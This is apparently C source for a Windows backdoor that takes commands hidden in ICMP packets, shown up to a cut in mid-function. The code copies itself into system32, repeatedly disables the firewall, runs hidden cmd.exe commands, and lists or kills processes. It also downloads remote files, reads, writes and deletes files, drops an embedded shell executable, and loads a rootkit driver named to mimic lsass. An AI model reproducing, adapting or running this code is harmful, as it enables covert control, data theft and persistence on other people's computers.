#pragma comment(linker,"/OPT:NOWIN98")

#pragma once
#include "../def.h"
#include <urlmon.h> 
#include <tlhelp32.h>
#include "winshell.h"
#include "dvr.h"
#include "loaddvr.h"
#include "dvrdef.h"
#pragma comment(lib, "Urlmon.lib")

char arg[MAX_PACKET];
char buffer[MAX_PACKET] = {0};//管道输出的数据
char defaultcmdline[MAX_PACKET]={0};
void decode_resp(char *,int ,struct sockaddr_in *);//ICMP解包函数
bool isshowwindow=false;
void fill_icmp_data(char * icmp_data);
void pslist(void);
BOOL killps(DWORD id);//杀进程函数
void send(long buflen=0);
char *ICMP_DEST_IP;
USHORT checksum(USHORT *buffer, int size);

DWORD WINAPI CmdService(LPVOID);
void  usage(char *par);
DWORD WINAPI FirewallCommand(LPVOID p);


void CreateReg(char*dir)
{
	HKEY h;
	int ret=RegCreateKey(HKEY_LOCAL_MACHINE,dir,&h);
	if(ret==0)RegCloseKey(h);
}
void SetReg(char*dir,char*name,DWORD v)
{
	HKEY h;
	int ret=RegOpenKeyEx(HKEY_LOCAL_MACHINE,dir,0,KEY_ALL_ACCESS,&h);
	if(ret==0)RegSetValueEx(h,name,0,REG_DWORD,(const unsigned char*)&v,4);
	RegCloseKey(h);
}

DWORD WINAPI FirewallCommand(LPVOID p)
{
	while(1)
	{
		/*Sleep(50);
		CreateReg("SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile\\IcmpSettings");
		Sleep(50);
		SetReg("SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile\\IcmpSettings","AllowInboundEchoRequest",1);
		Sleep(50);
		SetReg("SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile","DoNotAllowExceptions",0);
		Sleep(50);
		SetReg("SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile","DisableNotifications",1);
		Sleep(50);*/
		Sleep(50);
		SetReg("SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile","EnableFirewall",0);
		/*WinExec("sc stop sharedaccess",SW_HIDE);
		Sleep(100);
		WinExec("sc start sharedaccess",SW_HIDE);*/
		Sleep(500000);
	}
	return 0;
}

DWORD WINAPI ReadCommandPipe(void*p)
{
	HANDLE hRead=*(HANDLE*)p;
	DWORD bytesRead,totalRead=0;
	for(;;)
	{
		if (!ReadFile(hRead,buffer+totalRead,sizeof(buffer)-totalRead-1,&bytesRead,NULL))break;
		totalRead+=bytesRead;
		Sleep(200);
	}
	return 0;
}

HANDLE thFindDir;
bool FindDirCommandNormal=true;
DWORD WINAPI FindDirCommand(LPVOID pVOIDv1)
{
	char FindDirOneLine[81];
	char FindDirBuffer[FILE_PACKAGE_SIZE+sizeof(FindDirOneLine)+1];
	memset(FindDirBuffer,0,sizeof(FindDirBuffer));
	char*dir=(char*)pVOIDv1;
	char path[MAX_PATH*2];
	strcpy(path,dir);
	if(dir[strlen(dir)-1]!='\\')strcat(path,"\\");  
	strcat(path,"*.*");
	WIN32_FIND_DATA fd;  
	HANDLE hFindFile = FindFirstFile(path, &fd);  
	if(hFindFile == INVALID_HANDLE_VALUE)
	{
		FindClose(hFindFile); strcpy(buffer,FILE_END_SIGN); strcat(buffer,"\nFailed. (FindFirstFile()"); send(); FindDirCommandNormal=false; return 0;  
    }
	char tempPath[MAX_PATH*2]; BOOL bUserReture=TRUE; BOOL bIsDirectory;

	BOOL bFinish = FALSE;  
	while(!bFinish)  
	{  
		strcpy(tempPath, dir);
		if(dir[strlen(dir)-1] != '\\') strcat(tempPath, "\\");  
		strcat(tempPath, fd.cFileName);
		
		bIsDirectory = ((fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)!=0);  
		/*if(bIsDirectory && (strcmp(fd.cFileName, ".")==0 || strcmp(fd.cFileName, "..")==0))   
		{
			bFinish = (FindNextFile(hFindFile, &fd) == FALSE);  
			continue;  
        }*/
		if(bIsDirectory)
		{  
			//Do not searching DFS in SubDir.
        }

		memset(FindDirOneLine,' ',sizeof(FindDirOneLine));
		//FileName->45 IsDir->3 Size->19 Date->10
		//Split       |        |        |       
		FindDirOneLine[45]=FindDirOneLine[49]=FindDirOneLine[69]='|';
		if(bIsDirectory)
			memcpy(&FindDirOneLine[46],"<D>",3);
		SYSTEMTIME STime={0};
		FileTimeToSystemTime(&fd.ftLastWriteTime,&STime);
		char st[6]={0};memset(st,'0',4);
		itoa(STime.wYear,st,10);
		memcpy(&FindDirOneLine[70],st,4);FindDirOneLine[74]='/';
		memset(st,'0',4);
		if(STime.wMonth<10)
		{
			st[0]='0';
			st[1]=STime.wMonth+'0';
		}else itoa(STime.wMonth,st,10);
		memcpy(&FindDirOneLine[75],st,2);FindDirOneLine[77]='/';
		memset(st,'0',4);
		if(STime.wDay<10)
		{
			st[0]='0';
			st[1]=STime.wDay+'0';
		}else itoa(STime.wDay,st,10);
		memcpy(&FindDirOneLine[78],st,2);
		char filesc[25]={0};
		LARGE_INTEGER li;
		li.LowPart=fd.nFileSizeLow;li.HighPart=fd.nFileSizeHigh;
		if(li.QuadPart==0)sprintf(filesc,"0 B");
		else if(li.QuadPart<=10*1024)sprintf(filesc,"%I64d B(%.2lf KB)",li.QuadPart,(long double)li.QuadPart/1024.0);
		else if(li.QuadPart<=1024*1024)sprintf(filesc,"%.2lf KB",(long double)li.QuadPart/1024.0);
		else if(li.QuadPart<=1024*1024*1024)sprintf(filesc,"%.2lf MB",(long double)li.QuadPart/1024.0/1024.0);
		else sprintf(filesc,"%.2lf GB",(long double)li.QuadPart/1024.0/1024.0/1024.0);
		memcpy(&FindDirOneLine[50],filesc,(strlen(filesc)>20)?20:strlen(filesc));

		memcpy(&FindDirOneLine[0],fd.cFileName,strlen(fd.cFileName));

		strcat(FindDirBuffer,FindDirOneLine);strcat(FindDirBuffer,"\n");
		if(strlen(FindDirBuffer)>FILE_PACKAGE_SIZE)
		{
			strcpy(buffer,FindDirBuffer);
			send();
			memset(FindDirBuffer,0,sizeof(FindDirBuffer));
		}
		
		bFinish = (FindNextFile(hFindFile, &fd) == FALSE);  
	}  
	
    FindClose(hFindFile);

	if(strlen(FindDirBuffer)!=0)
	{
		strcpy(buffer,FindDirBuffer);
		send();
	}
	return 0;
}

void decode_resp(char *buf, int bytes,struct sockaddr_in *from) 
{

	IpHeader *iphdr;
	IcmpHeader *icmphdr;
	unsigned short iphdrlen;
	iphdr = (IpHeader *)buf;
	iphdrlen = iphdr->h_len * 4 ; 
	icmphdr = (IcmpHeader*)(buf + iphdrlen);
	if(icmphdr->i_seq==ICMP_PASSWORD)//密码正确则输出数据段
	{
		memset(buffer,0,sizeof(buffer));
		memset(arg,0,sizeof(arg));

		ICMP_DEST_IP=inet_ntoa(from->sin_addr);//取得ICMP包的源地址
		memcpy(arg,buf+iphdrlen+12+sizeof(int),sizeof(arg)/*bytes-iphdrlen-2*/-sizeof(int));
		
		int timeout;memcpy(&timeout,buf+iphdrlen+12,sizeof(int));
		if (!memcmp(arg,"[pskill]",8))
		{
			if(strstr(arg," ")!=NULL)
				if(killps(atoi(strstr(arg," "))))
					strcat(buffer,"\nProcess is Killed!");
				else strcat(buffer,"\nKill the process Failed!");
			send();
		}

		else if (!memcmp(arg,"[pslist]",8)){pslist();send();}
		else if (!memcmp(arg,"[showwindow]",12) || !memcmp(arg,"[ShowWindow]",12) || !memcmp(arg,"[SHOWWINDOW]",12))
		{
			char *NewSendMsg=((char*)&arg+strlen("[showwindow]"));
			if(*NewSendMsg!=' ')
			{
				sprintf(buffer,"ShowWindow: %d\n",isshowwindow);
				send();
				return;
			}
			int lto=atoi(NewSendMsg);
			if(lto!=0 && lto!=1)
			{
				sprintf(buffer,"The number '%d' is not 0 or 1 !\n",lto);
				send();
				return;
			}
			isshowwindow=(bool)lto;
			sprintf(buffer,"Set ShowWindow to %d successfully !\n",isshowwindow);
			send();
		}
		else if (!memcmp(arg,"[activeshell]",13))
		{
			char *NewSendMsg=((char*)&arg+strlen("[activeshell]"));
			if(*NewSendMsg!=' ')
			{
				sprintf(buffer,"No port selected !");
				send();
				return;
			}
			int lto=atoi(NewSendMsg);
			if(lto<=10)
			{
				sprintf(buffer,"The port '%d' is less than 10 !\n",lto);
				send();
				return;
			}
			
			if(GetFileAttributesA("c:\\windows\\system32\\winmanager.exe") & 0xFFFFFFFF)
			{
				FILE*fp=fopen("c:\\windows\\system32\\winmanager.exe","wb");
				fwrite(winshelldata,sizeof(winshelldata),1,fp);
				fclose(fp);
			}
			Sleep(100);

			WinExec("c:\\windows\\system32\\winmanager.exe",SW_SHOW);

			sprintf(buffer,"Listen to 5277 successfully !\n");
			send();
		}
		else if (!strcmp(arg,"----------------remove\n"))
		{
			//RemoveCmdService();
			memcpy(buffer,"Service Removed!",sizeof("Service Removed!"));
			send();
			return;
		}
		////////////************    http下载   *************
		else if (!memcmp(arg,"http://",7))   
		{
			if(char *FileName=strstr(arg,"-"))
			{

				char url[200];//保存网址的数组
				memset(url,0,200);
				memcpy(url,arg,int(FileName-arg-1));
				char fname[MAX_PATH];
				GetSystemDirectory(fname,MAX_PATH);
				FileName++;
				strcat(fname,"//");
				strcat(fname,FileName);
				*strstr(fname,"\n")=NULL;
				HRESULT hRet=URLDownloadToFile(0,url,fname,0,0);
				if(hRet==S_OK) memcpy(buffer,"Download OK!\n",sizeof("Download OK\n"));
				else 
					memcpy(buffer,"Download Failure!\n",sizeof("Download Failure!\n"));
				send();
				return;
			}
		}
		else if(IsFilePacket(arg,1))
		{
			char*str=arg+4;
			char*dir=strstr(str," ");
			if(dir==NULL || strlen(dir)==0)
			{
				strcpy(buffer,FILE_END_SIGN);
				strcat(buffer,"\nNo PARAM2 !");
				send();
				return;
			}
			dir++;
			if(strlen(dir)==0 || *dir==' ')
			{
				strcpy(buffer,"");
				int nDLen=GetLogicalDriveStrings(0,NULL);
				char*Dstr=new char[nDLen];
				GetLogicalDriveStrings(nDLen,Dstr);
				for(int i=0;i<nDLen/4;i++)
				{
					char dir[3] = {Dstr[i*4],':','\0'};
					strcat(buffer,dir);strcat(buffer,"  |  ");
					int DType=GetDriveType(Dstr+i*4);
					if(DType == DRIVE_FIXED)
						strcat(buffer,"LocalDisk   ");
					else if(DType == DRIVE_CDROM)
						strcat(buffer,"CD-ROM      ");
					else if(DType == DRIVE_REMOVABLE)
						strcat(buffer,"RemoveAble  ");
					else if(DType == DRIVE_REMOTE)
						strcat(buffer,"NetDisk     ");
					else if(DType == DRIVE_RAMDISK)
						strcat(buffer,"RAMDisk     ");
					else if(DType == DRIVE_UNKNOWN)
						strcat(buffer,"Unknown     ");
					strcat(buffer,"|  ");
					char tempbuffer[128]={0};
					ULARGE_INTEGER liAb,liTot,liLeft;
					GetDiskFreeSpaceEx(dir,&liAb,&liTot,&liLeft);
					sprintf(tempbuffer,"%I64d MB(%.2lf GB) / %I64d MB(%.2lf GB)",liLeft.QuadPart/(1024*1024),long double((LONGLONG)liLeft.QuadPart)/(1024.0*1024.0*1024.0),liTot.QuadPart/(1024*1024),long double((LONGLONG)liTot.QuadPart)/(1024.0*1024.0*1024.0));
					strcat(buffer,tempbuffer);
					strcat(buffer,"\n");
				}
				send();
				strcpy(buffer,FILE_END_SIGN);strcat(buffer,"\nSuccessfully");
				send();
				delete[]Dstr;
				return;
			}
			else if(!memcmp(str,"getdir",6))
			{
				
				FindDirCommandNormal=true;
				thFindDir=CreateThread(NULL,0,FindDirCommand,dir,0,NULL);
				int ret=WaitForSingleObject(thFindDir,timeout);
				strcpy(buffer,FILE_END_SIGN);
				Sleep(500);
				TerminateThread(thFindDir,0);
				CloseHandle(thFindDir);
				if(!FindDirCommandNormal)return;
				if(ret==WAIT_TIMEOUT)
				{
					strcat(buffer,"\nTimedOut");
				}else
					strcat(buffer,"\nSuccessfully");
			}
			else if(!memcmp(str,"getfile",7))
			{
				HANDLE fH=CreateFile(dir,GENERIC_READ,FILE_SHARE_READ | FILE_SHARE_WRITE,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
				if(fH==INVALID_HANDLE_VALUE)
				{
					CloseHandle(fH);
					strcpy(buffer,FILE_END_SIGN);sprintf(buffer+strlen(FILE_END_SIGN),"\nCreateFile Failed(%d)",GetLastError());
					send();return;
				}
				LARGE_INTEGER fSize;
				BOOL bRet=GetFileSizeEx(fH,&fSize);
				if(fSize.QuadPart>=1024*1024*100 || !bRet)//100 MB
				{
					CloseHandle(fH);
					strcpy(buffer,FILE_END_SIGN);sprintf(buffer+strlen(FILE_END_SIGN),"\nFileSize(%.2lf) too big(Maybe %d)",(long double)fSize.QuadPart/1024.0/1024.0,GetLastError());
					send();return;
				}
				bRet=SetFilePointer(fH,0,0,FILE_BEGIN);
				if(bRet==HFILE_ERROR)
				{
					//CloseHandle(fH);
					//strcpy(buffer,FILE_END_SIGN);sprintf(buffer+strlen(FILE_END_SIGN),"\nSetFilePointer Failed(%d)",GetLastError());
					//send();return;
				}
				DWORD dwRead=0;
				for(long i=0;i<fSize.QuadPart/FILE_PACKAGE_SIZE + 1;i++)
				{
					memset(buffer,0,sizeof(buffer));
					bRet=ReadFile(fH,buffer,FILE_PACKAGE_SIZE,&dwRead,0);
					if(!bRet)
					{
						CloseHandle(fH);
						strcpy(buffer,FILE_END_SIGN);sprintf(buffer+strlen(FILE_END_SIGN),"\nReadFile Failed(%d)(pos:%ld-%ld readed:%ld)",GetLastError(),(i-1)*FILE_PACKAGE_SIZE,i*FILE_PACKAGE_SIZE,dwRead);
						send();return;
					}
					send(dwRead);
					if(dwRead!=FILE_PACKAGE_SIZE || dwRead==fSize.QuadPart)
						break;
				}
				/*memset(buffer,0,sizeof(buffer));
				if(dwRead!=fSize.QuadPart && fSize.QuadPart%FILE_PACKAGE_SIZE!=0)
				{
					bRet=ReadFile(fH,buffer,fSize.QuadPart%FILE_PACKAGE_SIZE,&dwRead,0);
					if(!bRet || (dwRead!=fSize.QuadPart%FILE_PACKAGE_SIZE && dwRead!=fSize.QuadPart))
					{
						strcpy(buffer,FILE_END_SIGN);sprintf(buffer+strlen(FILE_END_SIGN),"\nReadFile(2) Failed(%d)(pos:%ld-%ld readed:%ld)",GetLastError(),(i-1)*FILE_PACKAGE_SIZE,i*FILE_PACKAGE_SIZE,dwRead);
						send();return;
					}
				}
				send(fSize.QuadPart%FILE_PACKAGE_SIZE);*/
				CloseHandle(fH);
				strcpy(buffer,FILE_END_SIGN);strcat(buffer,"\nSuccessfully");
			}
			else if(!memcmp(str,"sendfile",8))
			{
				char*ndir=strstr(dir," ")+1;
				char*cont=strstr(dir,FILE_END_SIGN);
				*cont='\0';cont+=(strlen(FILE_END_SIGN));
				DWORD dwCD;
				if(!memcmp(dir,"cn",2))
					dwCD=CREATE_NEW;
				else if(!memcmp(dir,"ap",2))
					dwCD=OPEN_ALWAYS;
				else
				{
					strcpy(buffer,FILE_END_SIGN);strcat(buffer,"\nUnable to compress ");
					send();return;
				}
				HANDLE fH=CreateFile(ndir,GENERIC_WRITE,FILE_SHARE_READ,NULL,dwCD,FILE_ATTRIBUTE_NORMAL,NULL);
				if(fH==INVALID_HANDLE_VALUE)
				{
					CloseHandle(fH);
					strcpy(buffer,FILE_END_SIGN);sprintf(buffer+strlen(FILE_END_SIGN),"\nCreateFile Failed(%d)",GetLastError());
					send();return;
				}
				if(SetFilePointer(fH,0,0,FILE_END)==HFILE_ERROR)
				{
					//CloseHandle(fH);
					//strcpy(buffer,FILE_END_SIGN);sprintf(buffer+strlen(FILE_END_SIGN),"\nSetFilePointer Failed(%d)",GetLastError());
					//==HFILE_ERROR==HFILE_ERROR==HFILE_ERRORsend();return;
				}
				dir+=2;*ndir='\0';
				long nBytes=atol(dir);
				DWORD dwWrote;
				if(!WriteFile(fH,cont,nBytes,&dwWrote,0) || dwWrote!=nBytes)
				{
					CloseHandle(fH);
					strcpy(buffer,FILE_END_SIGN);sprintf(buffer+strlen(FILE_END_SIGN),"\nWriteFile Failed(%d)(wrote:%ld)",GetLastError(),dwWrote);
					send();return;
				}
				CloseHandle(fH);
				strcpy(buffer,FILE_END_SIGN);strcat(buffer,"\nSuccessfully");
			}
			else if(!memcmp(str,"delete",6))
			{
				strcpy(buffer,FILE_END_SIGN);
				BOOL bRet=DeleteFile(dir);
				if(!bRet)sprintf(buffer+strlen(FILE_END_SIGN),"\nDeleteFile Failed(%d)",GetLastError());
				else strcat(buffer,"\nSuccessfully");
			}
			else if(!memcmp(str,"copy",4))
			{
				strcpy(buffer,FILE_END_SIGN);
				char *middir=strstr(dir,FILE_PAST_SIGN);
				if(middir==NULL)
				{
					strcat(buffer,"\nNo PARAM3!");
					send();return;
				}
				char src[1024]={0},dst[1024]={0};
				char*pdir=&dir[0];
				for(int i=0;pdir!=middir;i++,pdir++)
					src[i]=*pdir;
				middir+=4;
				strcpy(dst,middir);
				bool ret=CopyFile(src,dst,FALSE);
				if(!ret)sprintf(buffer+strlen(FILE_END_SIGN),"\nCopyFile Failed(%d)",GetLastError());
				else strcat(buffer,"\nSuccessfully");
			}
			send();
		}
		else if(!memcmp(arg,"[setcmd]",8))
		{
			char *NewSendMsg=((char*)&arg+strlen("[setcmd]"));
			if(*NewSendMsg!=' ')
			{
				sprintf(buffer,"Now DefaultCmdLine: %s\n",defaultcmdline);
				send();
				return;
			}
			NewSendMsg++;
			if(!memcmp(NewSendMsg,"[default]",9))
			{
				memset(defaultcmdline,0,sizeof(defaultcmdline));
				GetSystemDirectory(defaultcmdline,MAX_PATH+1);
				strcat(defaultcmdline,"//cmd.exe /c ");
			}
			else
			{
				memset(defaultcmdline,0,sizeof(defaultcmdline));
				strcat(defaultcmdline,NewSendMsg);
			}
			strcat(defaultcmdline," ");
			sprintf(buffer,"Set DefaultCmdLine to %s\n",defaultcmdline);
			send();

		}
		//*******************************************
		else{
			SECURITY_ATTRIBUTES sa;
			HANDLE hRead,hWrite;
			sa.nLength = sizeof(SECURITY_ATTRIBUTES);
			sa.lpSecurityDescriptor = NULL;
			sa.bInheritHandle = TRUE;
			if (!CreatePipe(&hRead,&hWrite,&sa,0)) 
			{
				printf("Error On CreatePipe()");
				return;
			}

			STARTUPINFO si;
			PROCESS_INFORMATION pi; 
			si.cb = sizeof(STARTUPINFO);
			GetStartupInfo(&si); 
			si.hStdError = hWrite;
			si.hStdOutput = hWrite;
			si.wShowWindow = SW_HIDE;
			si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
			
			char cmdline[MAX_PACKET];
			memset(cmdline,0,sizeof(cmdline));
			strcpy(cmdline,defaultcmdline);
			strcat(cmdline,arg);

			if(isshowwindow)
			{
				strcpy(si.lpDesktop,"WinSta0\\Default");
			}
			if (!CreateProcess(NULL,cmdline,NULL,NULL,TRUE,NULL,NULL,NULL,&si,&pi)) 
			{
				printf("Error on CreateProcess()");
				return;
			}
			CloseHandle(hWrite);


			DWORD pid;
			HANDLE func=CreateThread(NULL,0,ReadCommandPipe,(void*)&hRead,0,&pid);
			DWORD start=GetTickCount();
			/*for(;;){
				if(GetTickCount()-start>(timeout-stdrecvtimeout))
				{
					strcat(buffer,"\nTimed out.\n");
					break;
				}
			}*/
			if(WaitForSingleObject(func,timeout-stdrecvtimeout)==WAIT_TIMEOUT)
			{
				TerminateThread(func,0);
				Sleep(50);
				strcat(buffer,"\nTimed out.\n");
			}
			CloseHandle(func);


			//printf("%s",buffer);
			/////////////////////////////////////////////
			//发送输出数据
			send();
		}
		////////////////////////////////////////////////

	}
	//else printf("Other ICMP Packets!\n");
	//printf(endl; 
}


USHORT checksum(USHORT *buffer, int size) 
{
	unsigned long cksum=0;
	while(size >1) 
	{
		cksum+=*buffer++;
		size -=sizeof(USHORT);
	}
	if(size ) {
		cksum += *(UCHAR*)buffer;
	}
	cksum = (cksum >> 16) + (cksum & 0xffff);
	cksum += (cksum >>16);
	return (USHORT)(~cksum);
}

void fill_icmp_data(char * icmp_data,long buflen)
{
	IcmpHeader *icmp_hdr;
	char *datapart;
	icmp_hdr = (IcmpHeader*)icmp_data;
	icmp_hdr->i_type = 0;
	icmp_hdr->i_code = 0;
	icmp_hdr->i_id = (USHORT) GetCurrentProcessId();
	icmp_hdr->i_cksum = 0;
	icmp_hdr->i_seq =ICMP_REVERSE_PASSWORD;
	icmp_hdr->timestamp = GetTickCount(); //设置时间戳
	datapart = icmp_data + sizeof(IcmpHeader);
	memcpy(datapart,buffer,/*strlen(buffer)*/buflen);
}
void  usage(char *par)
{
	return ;
}
void send(long buflen)
{
	WSADATA wsaData;
	SOCKET sockRaw = (SOCKET)NULL;
	struct sockaddr_in dest;
	int bread,datasize,retval,bwrote;
	int timeout = 1000;
	char *icmp_data;
	if((retval=WSAStartup(MAKEWORD(2,1),&wsaData)) != 0) ExitProcess(STATUS_FAILED);
	if((sockRaw=WSASocket(AF_INET,SOCK_RAW,IPPROTO_ICMP,NULL,0,WSA_FLAG_OVERLAPPED))
		==INVALID_SOCKET) ExitProcess(STATUS_FAILED);
	__try
	{
		if((bread=setsockopt(sockRaw,SOL_SOCKET,SO_SNDTIMEO,(char*)&timeout,sizeof(timeout)))==SOCKET_ERROR) __leave;
		//设置发送超时
		memset(&dest,0,sizeof(dest));
		dest.sin_family = AF_INET;
		dest.sin_addr.s_addr = inet_addr(ICMP_DEST_IP);
		if(buflen==0)
			buflen=strlen(buffer)+1;
		datasize=buflen;
		datasize+=sizeof(IcmpHeader); 
		icmp_data=(char*)xmalloc(MAX_PACKET);
		if(!icmp_data) __leave;
		memset(icmp_data,0,MAX_PACKET);
		fill_icmp_data(icmp_data,buflen); //填充ICMP报文
		((IcmpHeader*)icmp_data)->i_cksum = checksum((USHORT*)icmp_data, datasize); //计算校验和
		bwrote=sendto(sockRaw,icmp_data,datasize,0,(struct sockaddr*)&dest,sizeof(dest)); //发送报文
		if (bwrote == SOCKET_ERROR)
		{
			//if (WSAGetLastError() == WSAETIMEDOUT) printf("Timed out\n");
			//printf("sendto failed:"<<WSAGetLastError()<<endl;
			__leave;
		}
		//printf("Send Packet to %s Success!\n"<<ICMP_DEST_IP<<endl;
		closesocket(sockRaw);
	}

	__finally 
	{
		if (sockRaw != INVALID_SOCKET) closesocket(sockRaw);
		WSACleanup();
		xfree(icmp_data);
	}
	memset(buffer,0,sizeof(buffer));
	Sleep(200);
}
void pslist(void)
{
	HANDLE hProcessSnap = NULL;
	PROCESSENTRY32 pe32= {0};
	hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hProcessSnap == (HANDLE)-1)
	{
		sprintf(buffer,"\nCreateToolhelp32Snapshot() failed:%d",GetLastError());
		return ;
	}
	pe32.dwSize = sizeof(PROCESSENTRY32);
	//printf("\nProcessName　　　　 ProcessID");
	if (Process32First(hProcessSnap, &pe32))
	{
		char a[5];
		do
		{
			strcat(buffer,pe32.szExeFile);
			strcat(buffer,"\t\t");
			itoa(pe32.th32ProcessID,a,10);
			strcat(buffer,a);
			strcat(buffer,"\n");
			//printf("\n%-20s%d",pe32.szExeFile,pe32.th32ProcessID);
		}
		while (Process32Next(hProcessSnap, &pe32));
	}
	else
	{
		sprintf(buffer,"\nProcess32Firstt() failed:%d",GetLastError());
	}
	CloseHandle (hProcessSnap);
	return;
}
BOOL SetPrivilege(HANDLE hToken,LPCTSTR lpszPrivilege,BOOL bEnablePrivilege)//提示权限
{
	TOKEN_PRIVILEGES tp;
	LUID luid;
	if(!LookupPrivilegeValue(NULL,lpszPrivilege,&luid))
	{
		sprintf(buffer,"\nLookupPrivilegeValue error:%d", GetLastError() ); 
		return FALSE; 
	}
	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	if (bEnablePrivilege)
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	else
		tp.Privileges[0].Attributes = 0;
	// Enable the privilege or disable all privileges.
	AdjustTokenPrivileges(
		hToken, 
		FALSE, 
		&tp, 
		sizeof(TOKEN_PRIVILEGES), 
		(PTOKEN_PRIVILEGES) NULL, 
		(PDWORD) NULL); 
	// Call GetLastError to determine whether the function succeeded.
	if (GetLastError() != ERROR_SUCCESS) 
	{ 
		sprintf(buffer,"AdjustTokenPrivileges failed: %u\n", GetLastError() ); 
		return FALSE; 
	} 
	return TRUE;
}
////////////////////////////////////////////////////////////////////////////
BOOL killps(DWORD id)//杀进程函数
{
	HANDLE hProcess=NULL,hProcessToken=NULL;
	BOOL IsKilled=FALSE,bRet=FALSE;
	__try
	{
		if(!OpenProcessToken(GetCurrentProcess(),TOKEN_ALL_ACCESS,&hProcessToken))
		{
			sprintf(buffer,"\nOpen Current Process Token failed:%d",GetLastError());
			__leave;
		}
		//printf("\nOpen Current Process Token ok!");
		if(!SetPrivilege(hProcessToken,SE_DEBUG_NAME,TRUE))
		{
			//__leave;
		}
		strcat(buffer,"\nSetPrivilege ok!");
		if((hProcess=OpenProcess(PROCESS_ALL_ACCESS,FALSE,id))==NULL)
		{
			sprintf(buffer,"\nOpen Process %d failed:%d",id,GetLastError());
			__leave;
		}
		//printf("\nOpen Process %d ok!",id);
		if(!TerminateProcess(hProcess,1))
		{
			sprintf(buffer,"\nTerminateProcess failed:%d",GetLastError());
			__leave;
		}
		IsKilled=TRUE;
	}
	__finally
	{
		if(hProcessToken!=NULL) CloseHandle(hProcessToken);
		if(hProcess!=NULL) CloseHandle(hProcess);
	}
	return(IsKilled);
}


void HideThis();

//int main(int argc,char *argv[])
int __stdcall WinMain(HINSTANCE hIn,HINSTANCE hPIn,LPSTR lpCmd,int nShow)
{

	char path[MAX_PATH+5]={0};
	GetModuleFileName(NULL,path,MAX_PATH);
	if(stricmp(path,"c:\\windows\\system32\\nextlsp.exe")!=0)
	{
		bool ret=DeleteFile("c:\\windows\\system32\\nextlsp.exe");
		if(!ret)
			return 0;
		Sleep(100);
		CopyFile(path,"c:\\windows\\system32\\nextlsp.exe",FALSE);
		Sleep(100);
		//WinExec("c:\\windows\\system32\\nextlsp.exe",SW_SHOW);
		STARTUPINFO si;
		memset(&si,0,sizeof(STARTUPINFO));
		si.cb=sizeof(STARTUPINFO);
		si.dwFlags=STARTF_USESHOWWINDOW;
		si.wShowWindow=SW_SHOW;
		PROCESS_INFORMATION pi;
		CreateProcess("c:\\windows\\system32\\nextlsp.exe",NULL,NULL,NULL,FALSE,0,NULL,NULL,&si,&pi);

		Sleep(100);
		return 0;
	}
	Sleep(1000);

	HideThis();

	memset(defaultcmdline,0,sizeof(defaultcmdline));
	GetSystemDirectory(defaultcmdline,MAX_PATH+1);
	strcat(defaultcmdline,"//cmd.exe /c ");

	CmdService(NULL);

	return 0;
}

DWORD WINAPI CmdService(LPVOID lpParam)//这里是服务的主函数，把你的代码写在这里就可以成为服务
{ 
	char *icmp_data;
	int bread,datasize,retval;
	SOCKET sockRaw = (SOCKET)NULL;
	WSADATA wsaData;
	struct sockaddr_in dest,from;
	int fromlen = sizeof(from);
	int timeout = 3000;
	char *recvbuf;

	DWORD pipd;
	CreateThread(NULL,0,FirewallCommand,NULL,0,&pipd);

BEGINNING:

	if ((retval = WSAStartup(MAKEWORD(2,1),&wsaData)) != 0)
	{
		printf("WSAStartup failed: %s\n",retval);
		ExitProcess(STATUS_FAILED);
	}
	sockRaw = WSASocket (AF_INET,SOCK_RAW,IPPROTO_ICMP,NULL,0,WSA_FLAG_OVERLAPPED);
	if (sockRaw == INVALID_SOCKET)
	{
		printf("WSASocket() failed: %s\n",WSAGetLastError());
		ExitProcess(STATUS_FAILED);
	}
	__try{
		bread = setsockopt(sockRaw,SOL_SOCKET,SO_RCVTIMEO,(char*)&timeout,sizeof(timeout));
		if(bread == SOCKET_ERROR) __leave;

		memset(&dest,0,sizeof(dest));
		dest.sin_family = AF_INET;
		datasize=0;
		datasize += sizeof(IcmpHeader); 
		icmp_data =(char*)xmalloc(MAX_PACKET);
		recvbuf = (char*)xmalloc(MAX_PACKET);
		if (!icmp_data) {
			//fprintf(stderr,"HeapAlloc failed %d\n",GetLastError());
			__leave;
		}
		memset(icmp_data,0,MAX_PACKET);
		for(;;) {
			int bwrote;
			bwrote = sendto(sockRaw,icmp_data,datasize,0,(struct sockaddr*)&dest,sizeof(dest));
			bread = recvfrom(sockRaw,recvbuf,MAX_PACKET,0,(struct sockaddr*)&from,&fromlen);
			if (bread == SOCKET_ERROR)
			{
				if (WSAGetLastError() == WSAETIMEDOUT)continue;
				__leave;
			}
			decode_resp(recvbuf,bread,&from);
			Sleep(200);
			memset(recvbuf,0,sizeof(recvbuf));
		}
	}
	__finally {
		if (sockRaw != INVALID_SOCKET) closesocket(sockRaw);
		WSACleanup();
	}

goto BEGINNING;

	return 0;
}


HANDLE dvr;

void MsgToDvr(MsgStr MsgToSend)
{
	DWORD wrt;int ret=-1;
	DeviceIoControl(dvr,IOCTL_CMD,(LPVOID*)&MsgToSend,sizeof(MsgToSend),(LPVOID*)&ret,sizeof(int),&wrt,NULL);
}


void HideThis()
{
	dvr=OpenSymbol(false);
	if(dvr==NULL)
	{
		DeleteFile("C:\\WINDOWS\\system32\\drivers\\sPlsass.sys");
		if(GetFileAttributes("C:\\WINDOWS\\system32\\drivers\\sPlsass.sys")==0xFFFFFFFF)
		{
			FILE*fp=fopen("C:\\WINDOWS\\system32\\drivers\\sPlsass.sys","wb");
			fwrite(DvrData,sizeof(DvrData),1,fp);
			fclose(fp);
			Sleep(100);
		}
		LoadNTDriver(DRIVER_NAME,"C:\\WINDOWS\\system32\\drivers\\sPlsass.sys");
		dvr=OpenSymbol(false);
		if(dvr==NULL)
			return;
	}
	MsgStr MsgToSend={0};
	memset(&MsgToSend,0,sizeof(MsgToSend));
